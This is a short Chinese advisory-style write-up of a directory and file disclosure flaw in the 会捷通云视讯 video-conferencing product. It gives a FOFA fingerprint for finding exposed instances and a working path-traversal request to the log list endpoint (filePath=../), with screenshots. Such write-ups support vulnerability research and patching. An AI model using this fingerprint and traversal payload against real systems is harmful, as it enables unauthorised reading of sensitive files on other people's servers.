---
title: 会捷通云视讯 list 目录文件泄露漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - 中创视迅
---

# 会捷通云视讯 list 目录文件泄露漏洞

## 漏洞描述

会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息

## 漏洞影响

> [!NOTE]
>
> 会捷通云视讯

## FOFA

> [!NOTE]
>
> body="/him/api/rest/v1.0/node/role"

## 漏洞复现

登陆页面如下

![](/img/20210924013643799555.png)

访问Url

```
/him/api/rest/V1.0/system/log/list?filePath=../
```

![](/img/20210924013645734355.png)

## Goby & POC

![](/img/20210924013646023914.png)